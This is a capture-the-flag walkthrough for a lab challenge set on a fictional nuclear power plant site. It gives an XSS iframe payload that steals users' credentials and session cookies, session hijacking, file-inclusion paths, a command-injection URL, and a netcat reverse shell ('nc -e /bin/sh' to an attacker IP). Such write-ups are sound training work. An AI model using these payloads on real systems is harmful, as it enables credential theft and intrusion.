# Challenge #1 - Nuclear Power Plant


## Scenario

- http://powerplant.site hosts a power plant management system. It is built with the latest technologies and provides to the power plant administrators functionalities such as:
  - The current power grid load
  - Remote facilities load and status
  - A chat between power plant operators, administrative employees, and managers
  - Managers and other employees access the system by visiting other sites. All the sites share the very same backend codebase.

## Objectives

- You have to find some vulnerabilities and exploit them, in order to:
1 Find all the active and idle users on the chat
2 Steal other users' credentials
3 Find the website used by other users to login to the chat
4 Run arbitrary commands on http://monitoring.site

## Steps

### Find the website used by other users to login to the chat

Scan the server with nmap using the option **-A** " to enable _OS detection, version detection, script scanning, and traceroute_.

```
nmap -A --open -p 80,443 -Pn powerplant.site
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-04 11:48 -03
Nmap scan report for powerplant.site (10.100.13.37)
Host is up (0.085s latency).
rDNS record for 10.100.13.37: 1.challenge.sqli.site

PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.2.22 (Debian)
| http-title: Power plant login
|_Requested resource was login.php
443/tcp open  http    Apache httpd 2.2.22
| http-ls: Volume /
|   maxfiles limit reached (10)
| SIZE  TIME               FILENAME
| -     26-Nov-2014 02:56  %5blogs%5d/
| 0     26-Nov-2014 02:56  %5blogs%5d/php-error.log
| -     18-May-2015 06:51  helpandsupport.site/
| -     22-May-2015 02:35  index.tmp/
| -     15-Jun-2015 00:39  index/
| -     11-Jun-2015 03:30  lab.html5.site/
| -     11-Jun-2015 08:41  monitoring.site/
| 586   11-Jun-2015 08:40  monitoring.site/heart_beat.php
| 500   11-Jun-2015 08:41  monitoring.site/notify_outage.php
| -     11-Jun-2015 08:41  monitoring.site/uploads/
|_
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: Index of /
Service Info: Host: 127.0.0.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.45 seconds
```

As you can see, the script http-ls detect some directories but due to maxfiles limit only 10 entries where retrieved. Run again removing the maxfiles limit.

```
nmap -p 40,443 -Pn --script http-ls --script-args ls.maxfiles=0 powerplant.site
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-04 11:48 -03
Nmap scan report for powerplant.site (10.100.13.37)
Host is up (0.085s latency).
rDNS record for 10.100.13.37: 1.challenge.sqli.site

PORT    STATE  SERVICE
40/tcp  closed unknown
443/tcp open   https
| http-ls: Volume /
| SIZE  TIME               FILENAME
| -     26-Nov-2014 02:56  %5blogs%5d/
| 0     26-Nov-2014 02:56  %5blogs%5d/php-error.log
| -     18-May-2015 06:51  helpandsupport.site/
| -     22-May-2015 02:35  index.tmp/
| -     15-Jun-2015 00:39  index/
| -     11-Jun-2015 03:30  lab.html5.site/
| -     11-Jun-2015 08:41  monitoring.site/
| 586   11-Jun-2015 08:40  monitoring.site/heart_beat.php
| 500   11-Jun-2015 08:41  monitoring.site/notify_outage.php
| -     11-Jun-2015 08:41  monitoring.site/uploads/
| -     12-Jun-2015 07:53  popular.site/
| -     18-May-2015 06:51  powerplant.site/
| -     18-May-2015 06:51  supervisor.site/
| -     10-Jun-2015 07:59  test/
| -     10-Jun-2015 07:59  websocket.site/
|_

Nmap done: 1 IP address (1 host up) scanned in 12.29 seconds
```

Open every url from the list and can solve the 3th question.

The websites used by other users to login to the chat are:
- helpandsupport.site
- supervisor.site
- powerplant.site

1 Find all the active and idle users on the chat
2 Steal other users' credentials
✔ 3 Find the website used by other users to login to the chat
4 Run arbitrary commands on http://monitoring.site


### Find all the active and idle users on the chat and steal other users' credentials

Login on powerplant.site, open the chat page and send the message below.

```html
<img src=1 onerror="alert(1)">
```

The chat is vulnerable to XSS.

To leak other user credentials open the popular.site management page.

```
http://popular.site/management/
```

Add the follow code to open a iFrame with the chat and confirm.

```html
<iframe src="http://helpandsupport.site/chat.php"></iframe>
```

Now every person that visits the popular.site will open the chat page.

Open the chat page and send the payload below.

```html
<iframe onload="
for (var i=0; i<window.frames.length; i++) {
            frameURL = window.frames[i];
            var steal = '';
            steal += frameURL.document.getElementsByName('user')[0].value;
            steal += ':';
            steal += frameURL.document.getElementsByName('tk')[0].value;
            steal += ':';
            steal += document.cookie;
            steal += ':';
            steal += document.domain;            
            socket.send(steal);
        }
" src="http://helpandsupport.site/change_password.php"></iframe>
```

This code will open change_password and send to you thru websocket the user data. Besides your credentials you will receive the credentials from helpdesk52.

```
helpdesk52:4f9dda746814a966497d334ce7849c7960efac88459fbdc4c5715f477a0180a13f103020eb5af55bebcccc32b943bf07b63c5cb905b7f1deefb89c8b3a5b8165:PHPSESSID=i3fdmn42dfh9bpc2acivu372u4:helpandsupport.site
```

No you can inpersonate the helpdesk52 user by change your PHPSESSID cookie.

Also it is possible to change their password using the username and tk parameters.

✔ 1 Find all the active and idle users on the chat
✔ 2 Steal other users' credentials
✔ 3 Find the website used by other users to login to the chat
4 Run arbitrary commands on http://monitoring.site

### Run arbitrary commands on http://monitoring.site

Open the file notify_outage.php

```
http://monitoring.site/notify_outage.php
```

Source code
```html
<script>
(function notify_outages() {
    setTimeout(function () {
	var number = Math.floor((Math.random()*100)+1);
	var msg = 'normal load';
	if (number > 95) {
	    msg = 'WARNING: reaching maximum capacity!';
	}
	else if (number > 85) {
	    msg = 'high load!';
	}
	else if (number > 65) {
	    msg = 'moderate load';
	}
	window.parent.postMessage(JSON.stringify({ "capacity" : number, "summary" : msg }), '*');
	notify_outages();
    }, Math.floor((Math.random() * 3000) + 1000))
})();
</script>
```

This file sends a post message to their parent. It is possible that some other page has a iFrame to load this one.

Now open the page hb_monitoring.php.

```
http://powerplant.site/hb_monitoring.php
```

Pay attention to the page source, starting from the iFrame and the folow javascript.

```html
<div style="visibility: hidden">
    <iframe height="0" width="0" src="http://monitoring.site/notify_outage.php" ></iframe>
</div>
<script>
    function processMessage(e) {
  var outages = document.getElementById("outages");
  var envelope = eval("("+e.data+")");
  var capacity = envelope['capacity'];
  var summary = envelope['summary'];
  var msg = 'Monitoring capacity: ' + capacity + '%';
  var resultdivpre = '<div id="outagesbody" class="progress-bar progress-bar-success" role="progressbar" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100" style="width: ';
      var resultdivpost = '%">';
      var resultdivclosing='%</div>';

  var outagesbody = document.getElementById("outagesbody");
  outagesbody.innerHTML = capacity + '%';
  outagesbody.style = 'width: ' + capacity + '%';
  if (capacity > 90) {
      //setTimeout("alert('" + summary + "')", 1000);
      //outages.style.backgroundColor =	'black';
      outagesbody.className="progress-bar progress-bar-danger";
  }
  else if (capacity > 75) {
      //outages.style.backgroundColor =	'red';
      outagesbody.className="progress-bar progress-bar-warning";
  }
  else if (capacity > 50) {
      //outages.style.backgroundColor =	'orange';
      outagesbody.className="progress-bar progress-bar-success";
  }
  else {
      //outages.style.backgroundColor =	'lightgreen';
      outagesbody.className="progress-bar progress-bar-info";
  }

  var outagesmsg = document.getElementById("outagesmsg");
  //outages.msg.innerHTML = message;

    }
    if (window.addEventListener) {// web browsers that nicely follow standards
  window.addEventListener("message", processMessage, false);
    }
    else {
  window.attachEvent("onmessage", processMessage);
    }
</script>
```

This has an hidden iFrame poiting to notify_outage.php.

To send commands do monitoring.site open the page hb_monitoring.php and on the javascript console send the command below.

```html
window.postMessage('{ "capacity" : 99, "summary" : "hacked" }', '*');
```

✔ 1 Find all the active and idle users on the chat
✔ 2 Steal other users' credentials
✔ 3 Find the website used by other users to login to the chat
✔ 4 Run arbitrary commands on http://monitoring.site

## Plus LFI and RCE

Run feroxbuster brute force on powerplant.site.

```
feroxbuster -u http://powerplant.site -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -C 403 -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://powerplant.site
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💢  Status Code Filters   │ [403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
302        0l        0w        0c http://powerplant.site/index.php
301        9l       28w      318c http://powerplant.site/pages
200      117l      280w     4239c http://powerplant.site/login.php
302        0l        0w        0c http://powerplant.site/chat.php
302        0l        0w        0c http://powerplant.site/home.php
302        0l        0w        0c http://powerplant.site/template.php
301        9l       28w      315c http://powerplant.site/js
301        9l       28w      320c http://powerplant.site/include
301        9l       28w      317c http://powerplant.site/dist
302        0l        0w        0c http://powerplant.site/load.php
302        0l        0w        0c http://powerplant.site/dump.php
301        9l       28w      317c http://powerplant.site/less
200       54l      174w     2143c http://powerplant.site/outages
302        0l        0w        0c http://powerplant.site/change_password.php
302        0l        0w        0c http://powerplant.site/view_page.php
302        0l        0w        0c http://powerplant.site/website_management.php
302        0l        0w        0c http://powerplant.site/add_page.php
[####################] - 11m   441090/441090  0s      found:17      errors:2      
[####################] - 11m   441090/441090  614/s   http://powerplant.site
```

Open the page website_management.php.

```
http://powerplant.site/website_management.php
```

From this page you can create, update and delete files using the user www-data. Sadly you can't change any of the files on the initial directory.

If you change the file parameter, it is possible to read any file on the server.

```
http://powerplant.site/view_page.php?file=add_page.php
```

In the page below, it is possible to read the source code from the page heart_beat.php.

```
http://powerplant.site/view_page.php?file=../../../var/www/monitoring.site/heart_beat.php
```

There are an RCE on this page on the parameter GET hb.

```
<?php
header('Content-Type: text/event-stream');
header('Cache-Control: no-cache');
header('Access-Control-Allow-Origin: ' . $_SERVER['HTTP_ORIGIN']);

$hb = @$_GET['hb'];

function send_msg($message) {
    print($message . "\n\n");
    ob_flush();
    flush();
}

while (true) {
    if ($hb) {
    send_msg("event: heart_beat\ndata: " . trim(shell_exec($hb)));
    sleep(2);
    }
    send_msg("event: server_load\ndata: " . json_encode(trim(shell_exec('top -b -n 1 | head -5'))));
    sleep(2);
    send_msg("event: traffic_loss\ndata: " . mt_rand(1, 100));
    sleep(2);
}
ob_end_flush();
```

Testing the RCE.

```
http://monitoring.site/heart_beat.php?hb=id

event: heart_beat
data: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Open other terminal and start netcat.

```
nc -nvlp 1234
```

Now run this command below to open a shell.

```
nc -e /bin/sh 10.100.13.200 1234
```

```
http://monitoring.site/heart_beat.php?hb=nc%20-e%20/bin/sh%2010.100.13.200%201234
```

Stabilize the session
```
python3 -c "import pty;pty.spawn('/bin/bash')"; export TERM=xterm
CTRL+z
stty raw -echo; fg
```

Now you can read all files and analyse how to attack them.